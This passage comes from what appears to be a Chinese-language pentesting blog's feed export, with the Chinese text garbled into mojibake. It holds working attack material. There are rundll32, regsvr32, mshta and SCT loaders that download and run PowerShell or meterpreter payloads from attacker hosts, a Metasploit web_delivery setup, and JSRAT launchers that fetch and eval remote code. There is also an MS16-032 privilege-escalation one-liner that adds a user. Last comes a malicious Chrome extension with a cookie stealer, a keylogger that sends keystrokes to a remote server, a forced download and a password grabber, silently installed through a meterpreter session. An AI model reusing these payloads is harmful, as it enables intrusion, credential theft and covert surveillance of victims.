Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Execution/Out-RundllCommand.ps1'); Out-RundllCommand -Reverse -IPAddress 192.168.230.1 -Port 443" å¦‚æœè¦æ‰§è¡Œè¿œç¨‹powershellè„šæœ¬ï¼Œå¯ä»¥è¿™æ ·ï¼š1Out-RundllCommand -PayloadURL http://192.168.230.1/Invoke-PowerShellUdp.ps1 -Arguments "Invoke-PowerShellUdp -Reverse -IPAddress 192.168.230.154 -Port 53" 0x02 è·å–meterpreterç”Ÿæˆps1è„šæœ¬ï¼š1msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.2.100 lport=8888 -f psh-reflection -o payload.ps1 å°†è„šæœ¬æ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼è·å–ä¼šè¯1ã€ç”Ÿæˆå‘½ä»¤ï¼š1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();r=new%20ActiveXObject("WScript.Shell").run("powershell -w h -nologo -noprofile -ep bypass IEX ((New-Object Net.WebClient).DownloadString('http://192.168.2.100/payload.ps1'));",0,true); 2ã€ç”ŸæˆSCTæ–‡ä»¶ï¼š SCTå†…å®¹å¦‚ä¸‹ï¼š123456789101112131415161718&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="PoC" classid="&#123;F0001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Proof Of Concept - Casey Smith @subTee --&gt; &lt;!-- License: BSD3-Clause --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ ps = 'powershell.exe -w h -nologo -noprofile -ep bypass '; c = "IEX ((New-Object Net.WebClient).DownloadString('http://192.168.2.100/payload.ps1'));"; r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; å°†UpdateCheck.xmlæ”¾åˆ°æœåŠ¡å™¨ä¸Šï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š1regsvr32.exe /u /n /s /i:http://192.168.2.100/UpdateCheck.xml scrobj.dll 3ã€ç”Ÿæˆjsæ–‡ä»¶ï¼š jsæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š123ps = 'powershell.exe -w h -nologo -noprofile -ep bypass ';c = "IEX ((New-Object Net.WebClient).DownloadString('http://192.168.2.100/payload.ps1'));";r = new ActiveXObject("WScript.Shell").Run(ps + c,0,true); åŒå‡»åˆ™ä¸Šçº¿ã€‚]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[DMZä¸‹ä½¿ç”¨web_delivery ä»‹ç»]]></title>
    <url>%2Farchives%2FUse_Web_delivery_Under_DMZ.html</url>
    <content type="text"><![CDATA[ä¹‹å‰ç¢°åˆ°çš„é—®é¢˜ï¼Œè‡ªå·±çš„ä¸»æœºåšäº†DMZï¼Œè®¾ç½®[b]web_delivery[/b]æ—¶ï¼Œå‘ç°å°†lhostè®¾ç½®æˆå¤–ç½‘ipï¼Œåˆ™è„šæœ¬ä¸èƒ½è¿è¡Œï¼Œå¦‚æœè®¾ç½®æˆå†…ç½‘ipï¼Œåˆ™åå¼¹payloadåå¼¹çš„åœ°å€ä¸ºå†…ç½‘åœ°å€ï¼Œå³ä¸å¯èƒ½è·å–åˆ°ä¼šè¯ï¼ŒæŸ¥çœ‹è¯¦ç»†é…ç½®ä¿¡æ¯ï¼Œå‘ç°å­˜åœ¨reverselistenerbindaddress è®¾ç½®é€‰é¡¹ï¼Œè§£å†³äº†æ­¤é—®é¢˜ï¼Œå½“ç„¶ï¼Œæ­¤å‚æ•°ä¹Ÿé€‚ç”¨äºç”¨vpsè½¬å‘ç«¯å£ä½¿ç”¨æœ¬åœ°msfçš„æƒ…å†µã€‚è¯¦ç»†é…ç½®å¦‚ä¸‹ï¼š ä½¿ç”¨vpsè½¬å‘ 8081 ç«¯å£åˆ°æœ¬åœ°8081ç«¯å£ (web_deliveryæœåŠ¡ç«¯å£)1ssh -N -R 8081:ip:8081 user@ip ä½¿ç”¨vpsè½¬å‘ 6666 ç«¯å£åˆ°æœ¬åœ°6666ç«¯å£ ï¼ˆweb_delivery payload ç›‘å¬ç«¯å£ï¼‰1ssh -N -R 6666:ip:6666 user@ip msfå¼€å¯å¹¶é…ç½®web_delivery123456789101112131415161718192021222324msf &gt; use exploit/multi/script/web_deliverymsf exploit(web_delivery) &gt; set target 2target =&gt; 2msf exploit(web_delivery) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(web_delivery) &gt; set SRVPORT 8081SRVPORT =&gt; 8081msf exploit(web_delivery) &gt; set URIPATH /URIPATH =&gt; /msf exploit(web_delivery) &gt; set lhost ip #å¤–ç½‘ipåœ°å€lhost =&gt; ipmsf exploit(web_delivery) &gt; set lport 6666lport =&gt; 6666msf exploit(web_delivery) &gt; set reverselistenerbindaddress 192.168.2.100 #å†…ç½‘ipåœ°å€reverselistenerbindaddress =&gt; 192.168.2.100msf exploit(web_delivery) &gt; exploit[*] Exploit running as background job.[*] Started reverse TCP handler on 192.168.2.100:6666msf exploit(web_delivery) &gt; [*] Using URL: http://0.0.0.0:8081/[*] Local IP: http://192.168.2.100:8081/[*] Server started.[*] Run the following command on the target machine:powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring('http://å¤–ç½‘ip:8081/'); å®¢æˆ·ç«¯æ‰§è¡Œï¼špowershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring(&#39;http://å¤–ç½‘ip:8081/&#39;); å†…ç½‘msfè·å–meterpreterä¼šè¯ã€‚ DMZæƒ…å½¢ä¸‹ï¼Œä¸éœ€è¦åšç«¯å£è½¬å‘ï¼Œåªéœ€è¦æŠŠlhostè®¾ç½®ä¸ºå¤–ç½‘ipåœ°å€ï¼Œreverselistenerbindaddress è®¾ç½®ä¸ºå†…ç½‘ipåœ°å€å³å¯ã€‚]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSRATå‡ ç§å¯åŠ¨æ–¹å¼]]></title>
    <url>%2Farchives%2FRun_JSRAT.html</url>
    <content type="text"><![CDATA[1.é»˜è®¤æ–¹å¼1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8081/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);&#125;% 2.Use SCTè¿è¡Œè®¡ç®—å™¨ï¼š1regsvr32 /u /s /i:http://urlto/calc.sct scrobj.dll calc.sct:12345678910111213141516171819202122232425262728293031323334353637&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration description="Empire" progid="Empire" version="1.00" classid="&#123;20001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- regsvr32 /s /i"C:\Bypass\Backdoor.sct" scrobj.dll --&gt; &lt;!-- regsvr32 /s /i:http://server/Backdoor.sct scrobj.dll --&gt; &lt;!-- That should work over a proxy and SSL/TLS... --&gt; &lt;!-- Proof Of Concept - Casey Smith @subTee --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;public&gt; &lt;method name="Exec"&gt;&lt;/method&gt;&lt;/public&gt;&lt;script language="JScript"&gt;&lt;![CDATA[ function Exec() &#123; var r = new ActiveXObject("WScript.Shell").Run("cmd.exe"); &#125; ]]&gt;&lt;/script&gt;&lt;/scriptlet&gt; è¿è¡ŒJSRAT:1regsvr32 /s /n /u /i:http://urlto/JSRAT.sct scrobj.dll JSRAT.sct12345678910111213141516&lt;?XML version="1.0"?&gt;&lt;scriptlet&gt;&lt;registration progid="ShortJSRAT" classid="&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;" &gt; &lt;!-- Learn from Casey Smith @subTee --&gt; &lt;script language="JScript"&gt; &lt;![CDATA[ rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try&#123;v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(\"GET\",\"http://127.0.0.1/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;"; new ActiveXObject("WScript.Shell").Run(rat,0,true); ]]&gt;&lt;/script&gt;&lt;/registration&gt;&lt;/scriptlet&gt; 3.Use WSCè¿è¡Œè®¡ç®—å™¨1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://urlto/calc.wsc") calc.wsc12345678910111213&lt;?xml version="1.0"?&gt;&lt;package&gt;&lt;component id="testCalc"&gt;&lt;script language="JScript"&gt;&lt;![CDATA[var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); ]]&gt;&lt;/script&gt;&lt;/component&gt;&lt;/package&gt; è¿è¡ŒJSRAT1rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://urlto/JSRAT.wsc") JSRAT.wsc:1234567891011121314&lt;?xml version="1.0"?&gt;&lt;package&gt;&lt;component id="testCalc"&gt;&lt;script language="JScript"&gt;&lt;![CDATA[ rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try&#123;v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(\"GET\",\"http://127.0.0.1/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;"; new ActiveXObject("WScript.Shell").Run(rat,0,true);]]&gt;&lt;/script&gt;&lt;/component&gt;&lt;/package&gt; 4.Use MSHTA1mshta javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://192.168.2.101:9998/connect",false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im mshta.exe",0,true);&#125;]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>jsrat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MS16-032 windowsæœ¬åœ°ææƒ]]></title>
    <url>%2Farchives%2FMS16-032-Windows-Privilege-Escalation.html</url>
    <content type="text"><![CDATA[exploit-dbçš„è¯¦æƒ…ï¼šhttps://www.exploit-db.com/exploits/39574/ è¯•ç”¨ç³»ç»Ÿï¼šTested on x32 Win7, x64 Win8, x64 2k12R2 ææƒpowershellè„šæœ¬ï¼š Invoke-MS16-032.ps1 æµ‹è¯•è¯¦æƒ…ï¼š ä¸ºäº†æ–¹ä¾¿ä½¿ç”¨ï¼Œå¯¹è¿™ä¸ªè„šæœ¬è¿›è¡Œäº†ç®€å•çš„ä¿®æ”¹ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ç¨‹åºï¼Œå¹¶å¯ä»¥æ·»åŠ å‚æ•°æ‰§è¡Œï¼ˆå…¨ç¨‹æ— å¼¹æ¡†ï¼‰è„šæœ¬åœ°å€ä¸ºï¼šInvoke-MS16-032.ps1 ä½¿ç”¨æ–¹å¼å¦‚ä¸‹:æ·»åŠ ç”¨æˆ·ï¼š è¿è¡ŒæŸç¨‹åºï¼š è¿œç¨‹åŠ ç”¨æˆ·ï¼šç›´æ¥æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œå¯è¿›è¡Œææƒå¹¶æ·»åŠ ç”¨æˆ·ï¼š1powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user evi1cg test123 /add'" æ¼”ç¤ºå¦‚ä¸‹ï¼š]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hack With Chrome Extension]]></title>
    <url>%2Farchives%2FHack_With_Chrome_Extension.html</url>
    <content type="text"><![CDATA[0x00 Introductionä¼—æ‰€å‘¨çŸ¥ï¼ŒWebåº”ç”¨å˜å¾—è¶Šæ¥è¶Šæµè¡Œï¼Œç”Ÿæ´»ï¼ŒåŠå…¬ï¼Œå¨±ä¹ç­‰ç­‰å¾ˆå¤šéƒ½æ˜¯é€šè¿‡Webï¼Œè€Œæµè§ˆå™¨æ˜¯æˆ‘ä»¬è®¿é—®Webæœ€å¸¸ä½¿ç”¨çš„å·¥å…·ä¹‹ä¸€ã€‚éšç€WebåŠŸèƒ½çš„å¼ºå¤§ï¼Œæµè§ˆå™¨çš„åŠŸèƒ½ä¹Ÿå˜å¾—è¶Šæ¥è¶Šå¼ºå¤§ã€‚è€Œæ­¤æ–‡ï¼Œå°±æ˜¯ä»‹ç»ä¸€ç§é€šè¿‡Chromeæ’ä»¶è¿›è¡Œæ”»å‡»çš„å§¿åŠ¿è·Ÿæ‰‹æ³•ã€‚ æ’°å†™æ­¤æ–‡æ—¶ï¼Œä»…å¯¹Chromeæµè§ˆå™¨è¿›è¡Œäº†éƒ¨åˆ†æµ‹è¯•ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´å¯ä»¥æ·±å…¥ï¼Œæœ¬æ–‡ä¸»è¦æ˜¯æä¾›ä¸€ç§æ€è·¯ã€‚ 0x01 Write Chrome Extensionåœ¨çŸ¥é“æ€ä¹ˆå†™æ’ä»¶ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆäº†è§£ä¸€ä¸‹æ’ä»¶çš„æ–‡ä»¶ç»“æ„ï¼Œéšä¾¿ä¸‹è½½ä¸€ä¸ªè°·æ­Œæ’ä»¶,å°†å…¶é‡å‘½åä¸ºzipåç¼€ä¹‹åè¿›è¡Œè§£å‹ï¼Œè§£å‹åçš„æ–‡ä»¶ç›®å½•å¦‚ä¸‹ï¼š å…¶ä¸­ï¼Œmanifest.jsonæ˜¯ä¸»æ–‡ä»¶ï¼Œæ¥å£°æ˜è¦å†™çš„æ’ä»¶çš„ç›¸å…³ä¿¡æ¯ã€‚å¯ä»¥æŠŠmainfest.jsonç†è§£æˆæ’ä»¶çš„å…¥å£ï¼Œå³chromeéœ€è¦é€šè¿‡manifest.jsonæ¥ç†è§£ä½ çš„æ’ä»¶è¦å¼•ç”¨å“ªäº›æ–‡ä»¶ ã€ éœ€è¦å“ªäº›æƒé™ ã€ æ’ä»¶å›¾æ ‡ ç­‰ä¿¡æ¯ã€‚è€Œå…¶ä»–æ–‡ä»¶ï¼Œå°±æ˜¯èƒ½å®ç°æ­¤æ’ä»¶åŠŸèƒ½çš„è„šæœ¬æ–‡ä»¶ä»¥åŠæ’ä»¶å›¾æ ‡ç­‰ã€‚ ä¸‹é¢ï¼Œæˆ‘ä»¬å¼€å§‹æ„é€ æˆ‘ä»¬çš„hack extensionã€‚é¦–å…ˆï¼Œ ç¼–å†™manifest.jsonæ–‡ä»¶å¦‚ä¸‹:1234567891011121314151617181920212223242526272829303132333435363738394041&#123; "name": "demo", //æ’ä»¶æ˜¾ç¤ºçš„åç§° "description": "demo", //æ’ä»¶çš„æè¿° "version": "1.0", //æ’ä»¶çš„ç‰ˆæœ¬ "manifest_version": 2, //æ–°ç‰ˆchromeå¼ºåˆ¶manifest_versionä¸º2 //æ’ä»¶çš„å›¾æ ‡ "icons": &#123; "16": "imgs/ico.png", "32": "imgs/ico.png", "48": "imgs/ico.png", "128": "imgs/ico.png" &#125;, //å®šä¹‰åå°çš„ä¸€äº›ç‰¹æ€§ "background":&#123; "scripts":[ //åŠ è½½æ’ä»¶çš„æ—¶å€™æ‰§è¡Œçš„è„šæœ¬ "js/call.js", "lib/jquery.min.js" ] &#125;, "content_scripts": [//å®šä¹‰è‡ªåŠ¨åŠ è½½çš„å†…å®¹ &#123; "matches": [ //æ»¡è¶³ä»€ä¹ˆæ ·çš„æ¡ä»¶æ‰§è¡Œè¯¥æ’ä»¶ "&lt;all_urls&gt;" ], "js": [ "lib/jquery.min.js", //æ»¡è¶³ä»¥åæ‰§è¡Œçš„è„šæœ¬ "js/check.js" ] &#125; ], //æ’ä»¶çš„æƒé™ "permissions": [ "tabs", "http://*/", "https://*/", "background", "webRequest", "storage", "browsingData" ]&#125; åˆ›å»ºä»¥ä¸‹æ–‡ä»¶ï¼š ç°åœ¨ï¼Œæ‰€æœ‰çš„æ–‡ä»¶å°±å…¨äº†ï¼Œä½†æ˜¯è¿˜æ²¡ä»€ä¹ˆåŠŸèƒ½ï¼Œå°è¯•åŠ è½½ä¸€ä¸‹æ’ä»¶ï¼Œæµè§ˆå™¨URLæ è¾“å…¥ chrome://extensions/ é€‰æ‹©åŠ è½½å·²è§£å‹çš„æ‰©å±•ç¨‹åºï¼Œä¹‹åé€‰æ‹©æ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹ã€‚ ç„¶åæ’ä»¶å°±å·²ç»è¢«åŠ è½½ä¸Šäº†ï¼š 0x02 How to Hackæ’ä»¶å·²ç»å¯ä»¥è¢«æˆåŠŸåŠ è½½äº†ï¼Œæ€ä¹ˆä½¿ç”¨å®ƒæ¥è¿›è¡Œæ”»å‡»å‘¢ï¼Œæˆ‘ä»¬å¼€å§‹ç¼–å†™ã€‚ 1ã€XSS Platformé…ç½®XSSå¹³å°ï¼Œè·å–é¡¹ç›®ä»£ç å¦‚ä¸‹ï¼š1&lt;script src=http://t.cn/xxxxxxx&gt;&lt;/script&gt; è®¿é—®http://t.cn/xxxxxx è·å–ä»£ç ï¼Œå°†å…¶å†™å…¥check.jsï¼Œå†…å®¹å¦‚ä¸‹ï¼š12 (function()&#123;(new Image()).src='http://xss9.com/index.php?do=api&amp;id=xxxxxx&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();if(''==1)&#123;keep=new Image();keep.src='http://xss9.com/index.php?do=keepsession&amp;id=xxxxxx&amp;url='+escape(document.location)+'&amp;cookie='+escape(document.cookie)&#125;; ä¿å­˜æ–‡ä»¶ï¼Œé‡æ–°åŠ è½½æ’ä»¶ï¼Œè®¿é—®ä»»æ„ç½‘ç«™ï¼Œè·å–è®¿é—®ç½‘ç«™çš„cookieä¿¡æ¯ï¼Œå¦‚ä¸‹å›¾ï¼š 2ã€Keylogerå°†ä»¥ä¸‹Payloadå†™å…¥check.jsä¸­ï¼š123456789101112131415161718$(document).ready(function()&#123; var server = "http://server.com/"; //æ¥æ”¶æœåŠ¡å™¨ var gate = "data.php?data="; //æ¥æ”¶æ–‡ä»¶ var tabURL = window.location.href; var keys=''; document.onkeypress = function(e) &#123; get = window.event?event:e; key = get.keyCode?get.keyCode:get.charCode; key = String.fromCharCode(key); keys+=key; &#125; window.setInterval(function()&#123; new Image().src = server+gate+keys; keys = ''; &#125;, 1000); &#125;); æ¥æ”¶phpæ–‡ä»¶å¦‚ä¸‹ï¼Œå°†æ­¤æ–‡ä»¶å‘½åä¸ºdata.phpç½®äºæœåŠ¡å™¨ä¸Šï¼š123456&lt;?php$txt = $_GET['data'];$log = fopen("keylog.txt", "a") or die("Unable to open file!");fwrite($log, $txt);fclose($log);?&gt; éœ€è¦åœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹keylog.txt,ç„¶åç»™777æƒé™å°±å¯ä»¥äº† åŠ è½½æ’ä»¶ä»¥åï¼Œé”®ç›˜è®°å½•å¯åŠ¨ï¼Œå½“ç”¨æˆ·åœ¨ç½‘é¡µä¸­è¿›è¡Œé”®ç›˜è¾“å…¥æ—¶ï¼Œè¾“å…¥æ•°æ®ä¼šå‘é€åˆ°è¿œç¨‹æœåŠ¡å™¨ã€‚ 3ã€ForceDownloadå¼ºåˆ¶ä¸‹è½½æ–‡ä»¶Payloadå¦‚ä¸‹ï¼Œæ­¤payloadå³å®‰è£…æ’ä»¶ä»¥åï¼Œè®¿é—®ä»»æ„ç½‘ç«™å¼ºåˆ¶ä¸‹è½½ç¨‹åºï¼š123456789101112$(document).ready(function()&#123; var server = "http://server.com/"; //æœåŠ¡å™¨ var gate = "/test/test.exe"; //è¦ä¸‹è½½çš„æ–‡ä»¶ var tabURL = window.location.href; var link = document.createElement('a');link.href = server+gate;link.download = '';document.body.appendChild(link);link.click(); &#125;); 4ã€Get Wooyun Passwordä»¥ä¸‹Payload ç”¨äºè·å–ç™»é™†wooyunçš„è´¦å·å¯†ç ã€‚123456789101112131415161718192021222324$(document).ready(function()&#123; var server = "http://xss9.com/"; //å‘é€åœ°å€ var gate = "index.php?do=api&amp;id=xxxxx"; //æ¥æ”¶å‚æ•° var tabURL = window.location.href; if(tabURL.indexOf('wooyun.org') !== -1 ) &#123; wooyun(); &#125; function email() &#123; var email = document.getElementsByName('email')[0].value; var password = document.getElementsByName('password')[0].value; var data = "&amp;username="+email+"&amp;password="+password; new Image().src = server+gate+data; //console.log("email="+email+"&amp;password="+password) &#125; function wooyun() &#123; document.getElementById('subbtn').onmouseover = email; &#125; &#125;); ä¿®æ”¹payloadå¯é’ˆå¯¹æ€§è·å–æŸç½‘ç«™è´¦å·å¯†ç ä¿¡æ¯ã€‚ Payloadå°±ä»‹ç»è¿™ä¹ˆå¤šäº†ï¼Œç†Ÿæ‚‰å‰ç«¯çš„ç«¥é‹ä¸€å®šå¯ä»¥åˆ›é€ æ›´å¤šèŠ±å¼ç©å„¿æ³•ã€‚ 0x03 When to Useæˆ–è®¸å°ä¼™ä¼´ä»¬ä¼šé—®ï¼Œå¼„è¿™ä¸ªæœ‰ä»€ä¹ˆç”¨ï¼Œæˆ‘åˆä¸éœ€è¦è£…è¿™ä¸ªæ’ä»¶æŠ“è‡ªå·±çš„å¯†ç ã€‚å½“ç„¶ï¼Œè¿™ä¸ªè‚¯å®šä¸æ˜¯ç”¨æ¥æè‡ªå·±çš„ã€‚æ¸—é€æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œæœ‰æ²¡æœ‰ç¢°åˆ°è¿‡çœ‹åˆ°ç®¡ç†å‘˜ç»å¸¸ä½¿ç”¨Chromeæµè§ˆå™¨ï¼Œè€Œæˆ‘ä»¬å´æ²¡åŠæ³•è·å–åˆ°å…¶å¸¸ç”¨å¯†ç å‘¢ï¼Ÿï¼ˆç®¡ç†å‘˜å¹¶æ²¡æœ‰ä½¿ç”¨æµè§ˆå™¨è®°ä½å¯†ç çš„åŠŸèƒ½ï¼‰ã€‚è¿™ä¸ªæ—¶å€™ï¼Œé™¤äº†ç»™ç³»ç»Ÿè£…é”®ç›˜è®°å½•å™¨ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä¸ºå…¶æµè§ˆå™¨è£…æˆ‘ä»¬ç¼–å†™çš„æ’ä»¶ã€‚è€Œè¿™ä¸ªæ’ä»¶ï¼Œå°±å¯ä»¥ç”¨æ¥æœé›†å„ç§æ•æ„Ÿä¿¡æ¯ï¼Œè€Œä¸”ï¼Œé’ˆå¯¹çš„æ˜¯æµè§ˆå™¨è®¿é—®çš„æ‰€æœ‰ç½‘ç«™ï¼ é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘å‘ç°chromeæ˜¯å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæ¥å®‰è£…æ’ä»¶çš„ï¼Œæ¥è®¾æƒ³ä¸€ä¸ªåœºæ™¯ï¼Œæˆ‘ä»¬ä½¿ç”¨æŸä¸ªæ¼æ´ï¼Œæˆ–è€…ç¤¾ä¼šå·¥ç¨‹å­¦è·å–äº†å°æ˜çš„è®¡ç®—æœºæ§åˆ¶æƒï¼Œç°åœ¨å·²ç»æœ‰äº†ä¸€ä¸ªmeterpreterä¼šè¯å¦‚ä¸‹ï¼š æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š1meterpreter &gt; run post/windows/gather/enum_chrome å¯ä»¥çœ‹åˆ°ç›®æ ‡ç³»ç»Ÿæ˜¯å®‰è£…äº†chromeæµè§ˆå™¨çš„ã€‚ ä¸Šä¼ æ’ä»¶ç›®å½•demoåˆ°e:\demo\ ç›®å½•ï¼Œç”±äºmeterpreterçš„uploadåªèƒ½ä¸Šä¼ æ–‡ä»¶ï¼Œä¸èƒ½ä¸Šä¼ æ–‡ä»¶å¤¹ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦æŠŠdemoæ–‡ä»¶å¤¹æ‰“åŒ…å‹ç¼©ä»¥åå†ä¸Šä¼ ï¼Œä¹‹åå†é€šè¿‡ç›®æ ‡ç³»ç»Ÿçš„è§£å‹è½¯ä»¶æˆ–è€…è‡ªå·±ä¸Šä¼ çš„unrar.exeè¿›è¡Œè§£å‹ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹å›¾: ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯»æ‰¾å®‰è£…çš„è§£å‹è½¯ä»¶ï¼š ä¹‹åä½¿ç”¨å¦‚ä¸‹å‘½ä»¤è¿›è¡Œè§£å‹å¹¶åˆ é™¤å‹ç¼©åŒ…ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹å›¾ï¼š ä¹‹åä¸ºchromeæ·»åŠ æ’ä»¶ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š1"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" --load-extension="F:\demo\demo" --silent-launch è·¯å¾„ä¸ºchromeé»˜è®¤å®‰è£…è·¯å¾„ï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œå¯ä»¥ä½¿ç”¨dirå‘½ä»¤æ¥æ‰¾ï¼Œ--load-extensionæ˜¯è¦åŠ è½½çš„æ’ä»¶è·¯å¾„ï¼Œ--silent-launchè¡¨ç¤ºä¸å¼€å¯chromeï¼Œé™é»˜å®‰è£…ã€‚æ³¨æ„ï¼šéœ€è¦åœ¨chromeæœªè¿è¡Œçš„æƒ…å†µä¸‹æ‰å¯æˆåŠŸåŠ è½½æ’ä»¶ã€‚ ä½¿ç”¨ä»¥ä¸Šå‘½ä»¤æœ‰ç°åœ¨ä¸¤ç‚¹ç¼ºç‚¹ï¼šç¼ºç‚¹ä¸€ï¼Œä¼šæœ‰å¦‚ä¸‹æç¤ºï¼ˆè¿‡å‡ ç§’ä¼šæ¶ˆå¤±ï¼‰ã€‚ ç¼ºç‚¹äºŒï¼Œæœ‰å›¾æ ‡ï¼Œæœ‰æç¤ºã€‚ ä¸€ç›´åœ¨æƒ³åŠæ³•è§£å†³ä»¥ä¸Šé—®é¢˜ï¼Œå›¾æ ‡å¯ä»¥æ¢æˆé€æ˜çš„æˆ–è€…å¸¸ç”¨çš„æ’ä»¶å›¾ç‰‡æ¥è§£å†³ï¼Œå¦å¤–ä¸¤ä¸ªæš‚æ—¶è¿˜æ²¡è§£å†³ï¼Œè¯¦ç»†çš„chromeå‘½ä»¤å¯ä»¥å‚è€ƒè¿™é‡Œ: chromium-command-lineï¼Œæœ‰å°ä¼™ä¼´æœ‰äº†è§£å†³æ–¹æ¡ˆè¿˜è¯·ä¸åèµæ•™ã€‚å½“ç„¶ä¹Ÿå¯ä»¥å°è¯•å†™ä¸€ä¸ªå°ç¨‹åºæ¥ç›‘æ§chromeï¼Œä¸€æ—¦chromeæ‰“å¼€ï¼Œåˆ™æ¨¡æ‹Ÿç‚¹å‡»äº‹ä»¶ç‚¹å‡»å–æ¶ˆæŒ‰é’®ã€‚ æœ€å¥½çš„æ–¹å¼å°±æ˜¯å¯ä»¥ç›´æ¥å»ä¸ºä»–å®‰è£…æ’ä»¶ï¼Œç„¶åç‚¹äº†è¿™å‡ ä¸ªæç¤ºä¹‹åï¼Œä¹‹åçš„ä½¿ç”¨åˆ™ä¸ä¼šå†æ¬¡å‡ºç°æç¤ºï¼Œè¿™æ ·å¯ä»¥éšè—æŒºé•¿æ—¶é—´ã€‚ 